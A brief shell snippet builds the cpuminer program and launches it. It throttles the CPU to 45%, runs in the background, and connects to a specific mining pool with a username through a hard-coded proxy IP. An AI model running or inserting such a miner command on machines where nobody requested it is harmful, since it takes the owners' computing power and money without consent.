...
./build.sh
make
cpulimit --exe cpuminer --limit 45 -b && ./cpuminer -a yescryptr16 -o stratum+tcp://cryply.luckypool.org:9996 -u manlytq.debian9 -p x -x 144.202.65.153:1102 --background
